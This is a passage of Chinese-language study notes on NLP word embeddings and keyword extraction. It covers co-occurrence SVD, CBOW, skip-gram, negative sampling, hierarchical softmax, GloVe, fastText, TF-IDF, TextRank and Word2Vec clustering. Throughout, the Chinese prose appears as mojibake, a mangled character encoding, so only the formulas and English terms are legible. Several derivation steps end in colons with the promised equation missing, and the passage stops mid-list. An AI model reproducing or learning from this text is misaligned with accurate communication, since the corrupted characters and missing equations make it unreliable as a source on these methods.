å»ºç«‹ä¸€ä¸ªè¯ç»„æ–‡æ¡£çŸ©é˜µ\\(X\\)ï¼Œå…·ä½“æ˜¯è¿™ä¹ˆåšçš„ï¼šéå†æµ·é‡çš„æ–‡ä»¶ï¼Œæ¯æ¬¡è¯ç»„iå‡ºç°åœ¨æ–‡ä»¶jä¸­æ—¶ï¼Œå°†\\(X_{ij}\\)çš„å€¼åŠ 1ã€‚è¿™ä¼šæ˜¯ä¸ªå¾ˆå¤§çš„çŸ©é˜µ\\(R^{|V| Ã—M}\\)ï¼Œè€Œä¸”çŸ©é˜µå¤§å°è¿˜å’Œæ–‡æ¡£ä¸ªæ•°Mæœ‰å…³ç³»ã€‚ åŸºäºçª—å£çš„å…±ç°çŸ©é˜µX â€‹ è§„å®šä¸€ä¸ªå›ºå®šå¤§å°çš„æ»‘åŠ¨çª—å£ï¼Œç„¶åç»Ÿè®¡æ¯ä¸ªä¸­å¿ƒè¯æ‰€åœ¨çª—å£ä¸­ç›¸é‚»è¯çš„è¯é¢‘ã€‚ I enjoy flying. I like NLP. I like deep learning. æœ‰ï¼š â€‹ å¯¹Xåšå¥‡å¼‚å€¼åˆ†è§£ï¼Œåªä¿ç•™å‰kä¸ªç»´åº¦ï¼š â€‹ æŠŠå­çŸ©é˜µ\\(U_{1:|V|,1:k}\\)è§†ä½œæˆ‘ä»¬çš„è¯åµŒå…¥çŸ©é˜µã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºè¯è¡¨ä¸­çš„æ¯ä¸€ä¸ªè¯ï¼Œæˆ‘ä»¬éƒ½ç”¨ä¸€ä¸ªkç»´çš„å‘é‡æ¥è¡¨è¾¾äº†ã€‚ â€‹ é—®é¢˜åœ¨äºï¼š çŸ©é˜µçš„ç»´åº¦ä¼šç»å¸¸å˜åŒ–ï¼ˆæ–°çš„è¯è¯­ç»å¸¸ä¼šå¢åŠ ï¼Œè¯­æ–™åº“çš„å¤§å°ä¹Ÿä¼šéšæ—¶å˜åŒ–ï¼‰ã€‚ çŸ©é˜µæ˜¯éå¸¸ç¨€ç–çš„ï¼Œå› ä¸ºå¤§å¤šæ•°è¯å¹¶ä¸åŒæ—¶å‡ºç°ã€‚ çŸ©é˜µçš„ç»´åº¦é€šå¸¸éå¸¸é«˜ï¼ˆ\\(â‰ˆ10^6Ã—10^6\\)ï¼‰ è®­ç»ƒéœ€è¦\\(O(n^2)\\)çš„å¤æ‚åº¦ï¼ˆæ¯”å¦‚SVDï¼‰ éœ€è¦ä¸“é—¨å¯¹çŸ©é˜µXè¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œä»¥åº”å¯¹è¯ç»„é¢‘ç‡çš„æåº¦ä¸å¹³è¡¡çš„çŠ¶å†µ â€‹ æœ‰ä¸€äº›åŠæ³•å¯ä»¥ç¼“è§£ä¸€ä¸‹ä¸Šè¿°æåˆ°çš„é—®é¢˜ï¼š å¿½è§†è¯¸å¦‚â€œheâ€ã€â€œtheâ€ ã€â€œhasâ€ç­‰åŠŸèƒ½è¯ã€‚ åº”ç”¨â€œå€¾æ–œçª—å£â€ï¼ˆramp windowï¼‰ï¼Œå³:æ ¹æ®æ–‡ä»¶ä¸­è¯ç»„ä¹‹é—´çš„è·ç¦»ç»™å®ƒä»¬çš„å…±ç°æ¬¡æ•°å¢åŠ ç›¸åº”çš„æƒé‡ã€‚ ä½¿ç”¨çš®å°”æ£®çš„ç›¸å…³æ€§ï¼ˆPearson correlationï¼‰ï¼Œå°†0è®°ä¸ºè´Ÿæ•°ï¼Œè€Œä¸æ˜¯å®ƒåŸæ¥çš„æ•°å€¼ã€‚ åŸºäºç¥ç»ç½‘ç»œçš„è¡¨ç¤ºæ–¹æ³• â€‹ å¦‚æœæ•°æ®é‡ä¸è¶³ï¼Œä¸è¦ä»é›¶å¼€å§‹è®­ç»ƒè‡ªå·±çš„è¯å‘é‡ è¿ç»­è¯è¢‹æ¨¡å‹ï¼ˆCBOWï¼‰ ä»¥ä¸Šä¸‹æ–‡ï¼Œé¢„æµ‹ä¸­å¿ƒè¯ã€‚ \\(w_i\\):å•è¯è¡¨Vä¸­çš„ç¬¬iä¸ªå•è¯ï¼Œiç»´æ˜¯1å…¶ä»–ç»´æ˜¯0çš„one-hotå‘é‡ \\(v\\in R^{n*|V|}\\)ï¼šè¾“å…¥è¯çŸ©é˜µ \\(v_i\\)ï¼šVçš„ç¬¬iåˆ—ï¼Œå•è¯\\(w_i\\)çš„è¾“å…¥å‘é‡ \\(u\\in R^{|V|*n}\\)ï¼šè¾“å‡ºè¯çŸ©é˜µ \\(u_i\\)ï¼šUçš„ç¬¬iè¡Œï¼Œå•è¯\\(w_i\\)çš„è¾“å‡ºå‘é‡ \\(n\\)ï¼šâ€œåµŒå…¥ç©ºé—´â€ï¼ˆembedding spaceï¼‰çš„ç»´åº¦ æ•´ä¸ªè¿‡ç¨‹: å¯¹äºmä¸ªè¯é•¿åº¦çš„çª—å£ï¼Œone-hotå‘é‡ï¼ˆ\\(x^{(c-m)},\\cdots,x^{(c-1)},x^{(c+1)},\\cdots,x^{(c+m)}\\)ï¼‰ã€‚ ä¸Šä¸‹æ–‡çš„åµŒå…¥è¯å‘é‡ï¼ˆ\\(v_{c-m+1}=Vx^{(c-m+1)},\\cdots, v_{c+m}=Vx^{(c+m)}\\) ï¼‰ å°†è¿™äº›å‘é‡å–å¹³å‡\\(\\hat v={v_{c-m}+v_{c-m+1}+\\cdots+v_{c+m}\\over2m}\\) äº§ç”Ÿä¸€ä¸ªlogitså‘é‡ \\(z=U\\hat v\\) å°†å¾—åˆ†å‘é‡è½¬æ¢æˆæ¦‚ç‡åˆ†å¸ƒå½¢å¼\\(\\hat y=softmax(z)\\) \\(y\\)æ˜¯ \\(x^{c}\\) çš„one-hotå‘é‡ã€‚è®¡ç®—æŸå¤±\\[H(\\hat y,y)=-\\sum_{j=1}^{|V|}y_jlog(\\hat y_j)\\] yåªæ˜¯ä¸€ä¸ªone-hotå‘é‡ï¼Œäºæ˜¯ä¸Šé¢çš„æŸå¤±å‡½æ•°å°±å¯ä»¥ç®€åŒ–ä¸ºï¼š â€‹ \\[H(\\hat y,y)=-y_ilog(\\hat y_i)\\] æœ€ç»ˆçš„ä¼˜åŒ–ç›®æ ‡ä¸ºï¼š ç”¨æ¢¯åº¦ä¸‹é™æ³•å»æ›´æ–°æ¯ä¸€ä¸ªç›¸å…³çš„è¯å‘é‡ğ‘¢ğ‘å’Œğ‘£ğ‘— Skip-Gram ä»¥ä¸­å¿ƒè¯é¢„æµ‹ä¸Šä¸‹æ–‡ã€‚ \\(w_i\\):å•è¯è¡¨Vä¸­çš„ç¬¬iä¸ªå•è¯ï¼Œiç»´æ˜¯1å…¶ä»–ç»´æ˜¯0çš„one-hotå‘é‡ \\(v\\in R^{n*|V|}\\)ï¼šè¾“å…¥è¯çŸ©é˜µ \\(v_i\\)ï¼šVçš„ç¬¬iåˆ—ï¼Œå•è¯\\(w_i\\)çš„è¾“å…¥å‘é‡ \\(u\\in R^{|V|*n}\\)ï¼šè¾“å‡ºè¯çŸ©é˜µ \\(u_i\\)ï¼šUçš„ç¬¬iè¡Œï¼Œå•è¯\\(w_i\\)çš„è¾“å‡ºå‘é‡ \\(n\\)ï¼šâ€œåµŒå…¥ç©ºé—´â€ï¼ˆembedding spaceï¼‰çš„ç»´åº¦ æ•´ä¸ªè¿‡ç¨‹: ç”Ÿæˆone-hotè¾“å…¥å‘é‡xã€‚ å¾—åˆ°ä¸Šä¸‹æ–‡çš„åµŒå…¥è¯å‘é‡\\(v_c=Vx\\)ã€‚ ä¸éœ€è¦å–å¹³å‡å€¼çš„æ“ä½œï¼Œæ‰€ä»¥ç›´æ¥æ˜¯\\(v_c\\)ã€‚ é€šè¿‡\\(u=Uv_c\\)äº§ç”Ÿ2mä¸ªlogitså‘é‡\\(u_{c-m},\\cdots,u_{c-1},u_{c+1},\\cdots,u_{(c+m)}\\)ã€‚ å°†logitså‘é‡è½¬æ¢æˆæ¦‚ç‡åˆ†å¸ƒå½¢å¼\\(y=softmax(u)\\)ã€‚ äº§ç”Ÿçš„æ¦‚ç‡åˆ†å¸ƒä¸çœŸå®æ¦‚ç‡åˆ†å¸ƒ\\(y^{c-m},\\cdots,y^{c-1},,y^{c+1}\\cdots,y^{c+m}\\)è®¡ç®—äº¤å‰ç†µæŸå¤±ã€‚ æœ€ç»ˆçš„ä¼˜åŒ–ç›®æ ‡ä¸ºï¼š ä¸åŒçš„åœ°æ–¹æ˜¯æˆ‘ä»¬è¿™é‡Œéœ€è¦å¼•å…¥æœ´ç´ è´å¶æ–¯å‡è®¾æ¥å°†è”åˆæ¦‚ç‡æ‹†åˆ†æˆç‹¬ç«‹æ¦‚ç‡ç›¸ä¹˜ã€‚ è´Ÿä¾‹é‡‡æ ·ï¼ˆNegative Samplingï¼‰ â€‹ å¯¹æ•´ä¸ªå•è¯è¡¨|V|æ±‚å’Œçš„è®¡ç®—é‡æ˜¯éå¸¸å·¨å¤§çš„ï¼Œä»»ä½•ä¸€ä¸ªå¯¹ç›®æ ‡å‡½æ•°çš„æ›´æ–°å’Œæ±‚å€¼æ“ä½œéƒ½ä¼šæœ‰O(|V|)çš„æ—¶é—´å¤æ‚åº¦ã€‚æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ€è·¯å»ç®€åŒ–ä¸€ä¸‹ï¼Œæˆ‘ä»¬æƒ³åŠæ³•å»æ±‚å®ƒçš„è¿‘ä¼¼ã€‚ â€‹ Mikolov ET AL.åœ¨ä»–çš„ã€ŠDistributed Representations of Words and Phrases and their Compositionalityã€‹ä¸­æå‡ºäº†è´Ÿä¾‹é‡‡æ ·ã€‚ â€‹ è€ƒè™‘ä¸€ä¸ªâ€œè¯-ä¸Šä¸‹æ–‡â€å¯¹ï¼ˆw,cï¼‰ï¼Œä»¤P(D = 1|w, c)ä¸º(w, c)æ¥è‡ªäºè¯­æ–™åº“çš„æ¦‚ç‡ã€‚ç›¸åº”çš„ï¼ŒP(D = 0|w, c) åˆ™æ˜¯ä¸æ¥è‡ªäºè¯­æ–™åº“çš„æ¦‚ç‡ã€‚å¯¹P(D = 1|w, c)ç”¨sigmoidå‡½æ•°å»ºæ¨¡ï¼š â€‹ \\[p(D=1|w,c,\\theta)= {1\\over{1+e^{(-v_c^Tv_w)}}}\\] â€‹ å»ºç«‹ä¸€ä¸ªæ–°çš„ç›®æ ‡å‡½æ•°ã€‚å¦‚æœ(w, c)çœŸæ˜¯æ¥è‡ªäºè¯­æ–™åº“ï¼Œç›®æ ‡å‡½æ•°èƒ½å¤Ÿæœ€å¤§åŒ–P(D = 1|w, c)ã€‚ â€‹ \\(\\tilde D\\)è¡¨ç¤ºä¸æ¥è‡ªäºè¯­æ–™åº“çš„æ•°æ®ã€‚ â€‹ åœ¨skip gramä¸­ï¼Œå¯¹äº\\(c - m + j\\)ä½ç½®çš„context å’Œ center word çš„ç›®æ ‡å‡½æ•°ä¸ºï¼šï¼ˆæ‰€æœ‰ä¸Šä¸‹æ–‡è¿˜è¦æ±‚å’Œï¼‰ â€‹ K -- ä¸ºè´Ÿä¾‹æ ·æœ¬çš„ä¸ªæ•°ã€‚ â€‹ è¿™æ ·å°† \\(|V|\\) wordsä¸­çš„softmaxï¼Œå˜æˆäº† Kä¸ªè´Ÿä¾‹ä¸­è¿›è¡Œ sigmoid ï¼Œå‡å°‘äº†è®¡ç®—é‡ã€‚å¤šåˆ†ç±»ç›®æ ‡å˜ä¸ºäºŒåˆ†ç±»ç›®æ ‡ã€‚ â€‹ åœ¨CBOWä¸­ä¸ºï¼š â€‹ è´Ÿä¾‹é‡‡æ ·åœ¨wordçš„è¯é¢‘åˆ†å¸ƒçš„3/4æ¬¡æ–¹ä¸Šè¿›è¡Œé‡‡æ ·ã€‚ä½¿å¾—åˆ†å¸ƒæ›´å¹³æ»‘ã€‚ Hierarchical Softmax â€‹ å¯¹CBOWæˆ–è€…Skip gramçš„æœ€åä¸€å±‚æŸå¤±æ±‚è§£æ–¹å¼æ”¹è¿›ã€‚ç›®æ ‡ä¸æ˜¯ç›®æ ‡å•è¯çš„one hotç¼–ç ï¼Œè€Œæ˜¯åœ¨æ‰€æœ‰å•è¯é¢„å…ˆæ„å»ºå¥½çš„Huffam treeä¸­çš„huffmanç¼–ç ã€‚ â€‹ æŸå¤±å‡½æ•°ç”±Huffam treeä¸­æ¯ä¸ªnodeçš„sigmoidå‡½æ•°é¢„æµ‹ç»“æœå’Œå®é™…çš„huffmanç¼–ç ä¹‹é—´è®¡ç®—æ±‚å¾—ã€‚ â€‹ Huffman treeä¿è¯äº†ä»»ä½•ä¸€ä¸ªå•è¯çš„ç¼–ç ä¸ä¼šæ˜¯å¦ä¸€ä¸ªå•è¯çš„å‰ç¼€ã€‚ â€‹ æ„å»ºæµç¨‹ï¼š æ ¹æ®æ‰€æœ‰å•è¯çš„è¯é¢‘æ„å»ºæœ€å°å †ã€‚ å–å‡ºå‰ä¸¤ä¸ªæœ€å°å•è¯ï¼ˆleft child and right childï¼‰ï¼Œå°†äºŒè€…è¯é¢‘ä¹‹å’Œä½œä¸ºæ–°èŠ‚ç‚¹æ’å…¥æœ€å°å †ã€‚ æ„å»ºå“ˆå¤«æ›¼æ ‘ï¼Œå»ºç«‹æ–°æ ‘èŠ‚ç‚¹ä½œä¸ºleft child and right childçš„çˆ¶èŠ‚ç‚¹ï¼Œå°†ä¸Šä¸€æ­¥çš„left child and right childäºŒè€…è¯é¢‘ä¹‹å’Œä½œä¸ºçš„è¯¥çˆ¶èŠ‚ç‚¹çš„å€¼ï¼Œæ„å»ºtreeã€‚ é‡å¤2ã€3æ­¥éª¤ï¼Œç›´åˆ°min heapä¸­åªæœ‰ä¸€ä¸ªnodeï¼Œæ­¤æ—¶ï¼Œå°†è¿™ä¸€ä¸ªnodeä½œä¸ºtreeçš„rootã€‚Huffam treeæ„å»ºå®Œæ¯•ã€‚ â€‹ huffmanç¼–ç ï¼šä»rootåˆ°leaf nodeçš„è·¯å¾„ï¼Œèµ°left childç¼–ç åŠ å…¥0ï¼Œèµ°right childç¼–ç åŠ å…¥1ã€‚æœ€ç»ˆç¼–ç ä¸ºè¯¥leaf nodeå¯¹åº”çš„ç¼–ç ã€‚ â€‹ è¶Šå¸¸ç”¨çš„è¯ï¼ˆè¯é¢‘è¶Šé«˜çš„è¯ï¼‰æ‹¥æœ‰æ›´çŸ­çš„ç¼–ç ã€‚ â€‹ word2vecä¸­æ­£å¥½é‡‡ç”¨äº†ç›¸åçš„ç¼–ç è§„åˆ™ï¼Œè§„å®šæ²¿ç€å·¦å­æ ‘èµ°ï¼Œé‚£ä¹ˆå°±æ˜¯è´Ÿç±»(å“ˆå¤«æ›¼æ ‘ç¼–ç 1)ï¼Œæ²¿ç€å³å­æ ‘èµ°ï¼Œé‚£ä¹ˆå°±æ˜¯æ­£ç±»(å“ˆå¤«æ›¼æ ‘ç¼–ç 0)ã€‚ â€‹ æ¯ä¸ªtree nodeå¤„ï¼š â€‹ \\[p(+)= {1\\over{1+e^{(-v_w^T\\theta)}}}\\] â€‹ æ¯ä¸ªtree nodeéƒ½æœ‰å‚æ•°\\(\\theta\\)ï¼Œè¾“å…¥æ˜¯skip gramæ¨¡å‹æœ€ç»ˆè¾“å‡ºçš„å‘é‡\\(v_w\\)ã€‚ Glove â€‹ åŠ å…¥äº†global statisticsï¼Œç”¨æŸä¸ªå¤§å°windowä¸­ä¸¤ä¸ªå•è¯çš„å…±ç°æ¬¡æ•°\\(X_{ij}\\)è¡¨ç¤ºã€‚ ç›®æ ‡å‡½æ•°ç”±cross entropyå˜ä¸ºleast squareã€‚ ç”¨\\(log(X_{ij})\\)ä½œä¸ºâ€œnormalization costâ€ã€‚ï¼ˆ\\(X_{ij}\\) : number of times word j occur in the context of word iï¼‰ \\(v_i\\)å’Œ\\(u_j\\)ç›¸ä¹˜ï¼Œä¸éœ€è¦ç”¨æŒ‡æ•°å‡½æ•°ã€‚(æ¨å¯¼ç»“æœ) åŠ å…¥weighted function \\(f(X_{ij})\\) æŸå¤±å‡½æ•°ï¼š \\[ J=\\sum_{i=1}^{V} \\sum_{j=1}^{V} f\\left(X_{i j}\\right)\\left(w_{i}^{T} w_{j}+b_{i}+b_{j}-\\log X_{i j}\\right)^{2} \\] \\(X_{ij}\\) --\\(i\\ \\textrm{and}\\ j\\)åœ¨æŸä¸ªçª—å£å¤§å°ä¸­çš„å…±ç°é¢‘ç‡ \\(f(X_{ij})\\)--æƒé‡ç³»æ•°ï¼Œå…±ç°è¶Šå¤šçš„ pair å¯¹äºç›®æ ‡å‡½æ•°è´¡çŒ®åº”è¯¥è¶Šå¤§ï¼Œä½†æ˜¯åˆä¸èƒ½æ— é™åˆ¶å¢å¤§ï¼Œæ‰€ä»¥å¯¹å…±ç°é¢‘ç‡è¿‡äºå¤§çš„ pair é™å®šæœ€å¤§å€¼ï¼Œä»¥é˜²è®­ç»ƒçš„æ—¶å€™è¢«è¿™äº›é¢‘ç‡è¿‡å¤§çš„ pair ä¸»å¯¼äº†æ•´ä¸ªç›®æ ‡å‡½æ•°ã€‚ b --ä¸¤ä¸ªåç½®é¡¹ \\(w_{i}\\) --å½“å‰è¯çš„å‘é‡ï¼Œ \\(w_{j}\\) --å¯¹åº”çš„æ˜¯ä¸å…¶åœ¨åŒä¸€ä¸ªçª—å£ä¸­å‡ºç°çš„å…±ç°è¯çš„è¯å‘é‡ï¼Œä¸¤è€…çš„å‘é‡ç‚¹ä¹˜è¦å»å°½é‡æ‹Ÿåˆå®ƒä»¬å…±ç°é¢‘ç‡çš„å¯¹æ•°å€¼ â€‹ å¦‚æœä¸¤ä¸ªè¯å…±ç°é¢‘ç‡è¶Šé«˜ï¼Œé‚£ä¹ˆå…¶å¯¹æ•°å€¼å½“ç„¶ä¹Ÿè¶Šé«˜ï¼Œå› è€Œç®—æ³•è¦æ±‚äºŒè€…è¯å‘é‡çš„ç‚¹ä¹˜ä¹Ÿè¶Šå¤§ã€‚ â€‹ è€Œä¸¤ä¸ªè¯å‘é‡çš„ç‚¹ä¹˜è¶Šå¤§ï¼Œå…¶å®åŒ…å«äº†ä¸¤å±‚å«ä¹‰ï¼š ç¬¬ä¸€ï¼Œè¦æ±‚å„è‡ªè¯å‘é‡çš„æ¨¡è¶Šå¤§ï¼Œé€šå¸¸æ¥è¯´ï¼Œé™¤å»é¢‘ç‡éå¸¸é«˜çš„è¯ï¼ˆæ¯”å¦‚åœç”¨è¯ï¼‰ï¼Œå¯¹äºæœ‰æ˜ç¡®è¯­ä¹‰çš„è¯æ¥è¯´ï¼Œå®ƒä»¬çš„è¯å‘é‡æ¨¡é•¿ä¼šéšç€è¯é¢‘å¢å¤§è€Œå¢å¤§ï¼Œå› æ­¤ä¸¤ä¸ªè¯å…±ç°é¢‘ç‡è¶Šå¤§ï¼Œè¦æ±‚å„è‡ªè¯å‘é‡æ¨¡é•¿è¶Šå¤§æ˜¯æœ‰ç›´è§‰æ„ä¹‰çš„ ç¬¬äºŒï¼Œè¦æ±‚è¿™ä¸¤ä¸ªè¯å‘é‡çš„å¤¹è§’è¶Šå°ï¼Œè¿™ä¹Ÿæ˜¯ç¬¦åˆç›´è§‰çš„ï¼Œå› ä¸ºå‡ºç°åœ¨åŒä¸€ä¸ªè¯­å¢ƒä¸‹é¢‘ç‡è¶Šå¤§ï¼Œè¯´æ˜è¿™ä¸¤ä¸ªè¯çš„è¯­ä¹‰è¶Šæ¥è¿‘ï¼Œå› è€Œè¯å‘é‡çš„å¤¹è§’ä¹Ÿåå‘äºè¶Šå°ã€‚ fastText â€‹ word2vec å’Œ GloVe éƒ½ä¸éœ€è¦äººå·¥æ ‡è®°çš„ç›‘ç£æ•°æ®ï¼Œåªéœ€è¦è¯­è¨€å†…éƒ¨å­˜åœ¨çš„ç›‘ç£ä¿¡å·å³å¯ä»¥å®Œæˆè®­ç»ƒã€‚è€Œä¸æ­¤ç›¸å¯¹åº”çš„ï¼ŒfastText åˆ™æ˜¯åˆ©ç”¨å¸¦æœ‰ç›‘ç£æ ‡è®°çš„æ–‡æœ¬åˆ†ç±»æ•°æ®å®Œæˆè®­ç»ƒã€‚ â€‹ ç±»ä¼¼CBOWï¼Œä½†ä¸åŒç‚¹åœ¨äºï¼š åœ¨è¾“å…¥æ•°æ®ä¸Šï¼ŒCBOW è¾“å…¥çš„æ˜¯ä¸€æ®µåŒºé—´ä¸­é™¤å»ç›®æ ‡è¯ä¹‹å¤–çš„æ‰€æœ‰å…¶ä»–è¯çš„å‘é‡åŠ å’Œæˆ–å¹³å‡ï¼Œè€Œ fastText ä¸ºäº†åˆ©ç”¨æ›´å¤šçš„è¯­åºä¿¡æ¯ï¼Œå°† bag-of-words å˜æˆäº† bag-of-featuresï¼Œä¹Ÿå°±æ˜¯è¾“å…¥ x ä¸å†ä»…ä»…æ˜¯ä¸€ä¸ªè¯ï¼Œè¿˜å¯ä»¥åŠ ä¸Šå­—ç¬¦çº§åˆ«çš„ bigram æˆ–è€…æ˜¯ trigram çš„ä¿¡æ¯ç­‰ç­‰ã€‚ ç¬¬äºŒä¸ªä¸åŒåœ¨äºï¼ŒCBOW é¢„æµ‹ç›®æ ‡æ˜¯è¯­å¢ƒä¸­çš„ä¸€ä¸ªè¯ï¼Œè€Œ fastText é¢„æµ‹ç›®æ ‡æ˜¯å½“å‰è¿™æ®µè¾“å…¥æ–‡æœ¬çš„ç±»åˆ«ï¼Œæ­£å› ä¸ºéœ€è¦è¿™ä¸ªæ–‡æœ¬ç±»åˆ«ï¼Œå› æ­¤æ‰è¯´ fastText æ˜¯ä¸€ä¸ªç›‘ç£æ¨¡å‹ã€‚ â€‹ fastText çš„ç½‘ç»œç»“æ„å’Œ CBOW åŸºæœ¬ä¸€è‡´ï¼ŒåŒæ—¶åœ¨è¾“å‡ºå±‚çš„åˆ†ç±»ä¸Šä¹Ÿä½¿ç”¨äº† Hierachical Softmax æŠ€å·§æ¥åŠ é€Ÿè®­ç»ƒã€‚ â€‹ ç›®æ ‡å‡½æ•°ï¼š \\[ -\\frac{1}{N} \\sum_{n=1}^{N} y_{n} \\log f\\left(B A x_{n}\\right) \\] \\[ x_{n}=\\sum_{i=1}^{l_{n}} x_{n, i} \\] \\(x_{n, i}\\) --è¯­æ–™å½“ä¸­ç¬¬ n ç¯‡æ–‡æ¡£çš„ç¬¬ i ä¸ªï¼ˆè¯ æˆ–è€… char N-gramï¼‰ A --æœ€ç»ˆå¯ä»¥è·å–çš„è¯å‘é‡ä¿¡æ¯ è¯å‘é‡çš„ä½œç”¨ä¸è·å– â€‹ é«˜é˜¶çš„æ·±åº¦å­¦ä¹ è‡ªç„¶è¯­è¨€å¤„ç†ä»»åŠ¡ï¼Œéƒ½å¯ä»¥ç”¨è¯å‘é‡ä½œä¸ºåŸºç¡€ã€‚å¯ä»¥ä»å¼€æºé“¾æ¥è·å–ã€‚ è¯å‘é‡çš„æ„ä¹‰ åŸºäºè¯ä¸å…¶ä»–è¯çš„æŸç§å…±ç°å…³ç³» skip-gram with negative-sampling ä¸ PMIçŸ©é˜µ çš„ç­‰ä»·æ€§è¯æ˜ã€ŠNeural-Word-Embeddings-as-Implicit-Matrix-Factorizationã€‹ ç¥ç»ç½‘ç»œä¸SVDçš„æ±‚è§£æ–¹æ³•åªæ˜¯é™ç»´æ–¹å¼çš„ä¸åŒ ç¥ç»ç½‘ç»œæ›´åƒMFï¼Œè€ŒMFä¸SVDçš„é™ç»´çš„çº¦æŸæ¡ä»¶ä¸åŒï¼Œç¥ç»ç½‘ç»œçš„ç›®æ ‡å‡½æ•°ä¸MFçš„ç›®æ ‡å‡½æ•°ä¹Ÿä¸åŒ GloVeä¸MFå…³ç³»æ›´è¿‘ ç›®æ ‡å‡½æ•°æ›´åƒ CBOWæ²¡æœ‰ç±»ä¼¼çš„é™ç»´çŸ©é˜µå¯¹åº” åŸºäºè¯­è¨€æ¨¡å‹ è¯å‘é‡ä¸è¯­è¨€æ¨¡å‹æœ¬æ¥æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„NLPé—®é¢˜é¢†åŸŸï¼Œå› ä¸ºæ·±åº¦å­¦ä¹ è”ç³»åœ¨äº†ä¸€èµ·ã€‚ åŸºäºè¯å‘é‡æ„å»ºæˆå¥å­å‘é‡è¿›è€Œè¿›è€Œå®Œæˆè¯­è¨€æ¨¡å‹çš„ä»»åŠ¡ åŸºäºå…¶ä»–ç›‘ç£å­¦ä¹ ä»»åŠ¡ è¯å‘é‡å¹¶ä¸åªæ˜¯è¯­è¨€æ¨¡å‹å¯ä»¥å¾—åˆ°ï¼ŒåŸºäºæœ‰ç›‘ç£å­¦ä¹ ä¹Ÿå¯ä»¥å¾—åˆ°ï¼šC&amp;Wäº†è§£ åŸºäºè¯å‘é‡æ„å»ºæˆå¥å­å‘é‡è¿›è€Œå®Œæˆæ–‡æœ¬åˆ†ç±»æˆ–æ–‡æœ¬ç›¸ä¼¼åº¦åˆ¤æ–­çš„ä»»åŠ¡ 4.å…³é”®è¯æå– TF-IDFæ–‡æœ¬å…³é”®è¯æŠ½å–æ–¹æ³• ï¼ˆ1ï¼‰ å¯¹äºç»™å®šçš„æ–‡æœ¬Dè¿›è¡Œåˆ†è¯ã€è¯æ€§æ ‡æ³¨å’Œå»é™¤åœç”¨è¯ç­‰æ•°æ®é¢„å¤„ç†æ“ä½œã€‚å¾—åˆ°nä¸ªå€™é€‰å…³é”®è¯ï¼Œå³D=[t1,t2,â€¦,tn] ï¼› ï¼ˆ2ï¼‰ è®¡ç®—è¯è¯­ti åœ¨æ–‡æœ¬Dä¸­çš„è¯é¢‘ï¼› ï¼ˆ3ï¼‰ è®¡ç®—è¯è¯­ti åœ¨æ•´ä¸ªè¯­æ–™çš„IDF=log (Dn /(Dt +1))ï¼ŒDt ä¸ºè¯­æ–™åº“ä¸­è¯è¯­ti å‡ºç°çš„æ–‡æ¡£ä¸ªæ•°ï¼› ï¼ˆ4ï¼‰ è®¡ç®—å¾—åˆ°è¯è¯­ti çš„TF-IDF=TF*IDFï¼Œå¹¶é‡å¤ï¼ˆ2ï¼‰â€”ï¼ˆ4ï¼‰å¾—åˆ°æ‰€æœ‰å€™é€‰å…³é”®è¯çš„TF-IDFæ•°å€¼ï¼› ï¼ˆ5ï¼‰ å¯¹å€™é€‰å…³é”®è¯è®¡ç®—ç»“æœè¿›è¡Œå€’åºæ’åˆ—ï¼Œå¾—åˆ°æ’åå‰TopNä¸ªè¯æ±‡ä½œä¸ºæ–‡æœ¬å…³é”®è¯ã€‚ åŸºäºTextRankçš„æ–‡æœ¬å…³é”®è¯æŠ½å–æ–¹æ³• ï¼ˆ1ï¼‰ å¯¹äºç»™å®šçš„æ–‡æœ¬Dè¿›è¡Œåˆ†è¯ã€è¯æ€§æ ‡æ³¨å’Œå»é™¤åœç”¨è¯ç­‰æ•°æ®é¢„å¤„ç†æ“ä½œã€‚å¾—åˆ°nä¸ªå€™é€‰å…³é”®è¯ï¼Œå³D=[t1,t2,â€¦,tn] ï¼› ï¼ˆ2ï¼‰ æ„å»ºå€™é€‰å…³é”®è¯å›¾G=(V,E)ï¼Œå…¶ä¸­Vä¸ºèŠ‚ç‚¹é›†ï¼Œç”±å€™é€‰å…³é”®è¯ç»„æˆï¼Œå¹¶é‡‡ç”¨å…±ç°å…³ç³»æ„é€ ä»»ä¸¤ç‚¹ä¹‹é—´çš„è¾¹ï¼Œä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´ä»…å½“å®ƒä»¬å¯¹åº”çš„è¯æ±‡åœ¨é•¿åº¦ä¸ºKçš„çª—å£ä¸­å…±ç°åˆ™å­˜åœ¨è¾¹ï¼ŒKè¡¨ç¤ºçª—å£å¤§å°å³æœ€å¤šå…±ç°Kä¸ªè¯æ±‡ï¼› ï¼ˆ3ï¼‰ æ ¹æ®å…¬å¼è¿­ä»£è®¡ç®—å„èŠ‚ç‚¹çš„æƒé‡ï¼Œç›´è‡³æ”¶æ•›ï¼›(è§ä¸­æ–‡æ–‡æœ¬å¤„ç†éƒ¨åˆ†) ï¼ˆ4ï¼‰ å¯¹èŠ‚ç‚¹æƒé‡è¿›è¡Œå€’åºæ’åˆ—ï¼Œå¾—åˆ°æ’åå‰TopNä¸ªè¯æ±‡ä½œä¸ºæ–‡æœ¬å…³é”®è¯ã€‚ åŸºäºWord2Vecè¯èšç±»çš„æ–‡æœ¬å…³é”®è¯æŠ½å–æ–¹æ³• ï¼ˆ1ï¼‰ å¯¹Wikiä¸­æ–‡è¯­æ–™è¿›è¡ŒWord2vecæ¨¡å‹è®­ç»ƒï¼Œä»£ç  ï¼ˆ2ï¼‰ å¯¹äºç»™å®šçš„æ–‡æœ¬Dè¿›è¡Œåˆ†è¯ã€è¯æ€§æ ‡æ³¨å’Œå»é™¤åœç”¨è¯ç­‰æ•°æ®é¢„å¤„ç†æ“ä½œã€‚å¾—åˆ°nä¸ªå€™é€‰å…³é”®è¯ï¼Œå³D=[t1,t2,â€¦,tn] ï¼› ï¼ˆ3ï¼‰ éå†å€™é€‰å…³é”®è¯ï¼Œä»è¯å‘é‡æ–‡ä»¶ä¸­æŠ½å–å€™é€‰å…³é”®è¯çš„è¯å‘é‡è¡¨ç¤ºï¼Œå³WV=[v1ï¼Œv2ï¼Œâ€¦ï¼Œvm]ï¼› ï¼ˆ4ï¼‰ å¯¹å€™é€‰å…³é”®è¯è¿›è¡ŒK-Meansèšç±»ï¼Œå¾—åˆ°å„ä¸ªç±»åˆ«çš„èšç±»ä¸­å¿ƒï¼› ï¼ˆ5ï¼‰ 